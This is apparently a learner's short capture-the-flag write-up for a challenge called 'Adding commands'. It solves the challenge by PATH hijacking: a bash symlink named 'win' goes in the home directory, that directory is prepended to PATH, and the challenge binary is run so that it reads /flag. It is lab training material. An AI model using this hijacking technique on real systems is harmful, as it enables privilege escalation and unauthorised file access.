# Adding commands

## Code

```bash
ln -s /usr/bin/bash ./win
PATH=/home/hacker/:$PATH
/challenge/run
cat /flag
```
## Explanation

i used find / -name bash to get the bash shell location
then used the ln command to create links between files .
the command PATH=/home/hacker/:$PATH sets the PATH variable to include the /home/hacker/ directory at the beginning,
ensuring that any executables in that directory are found first by the shell.

## References

used help from chat gpt
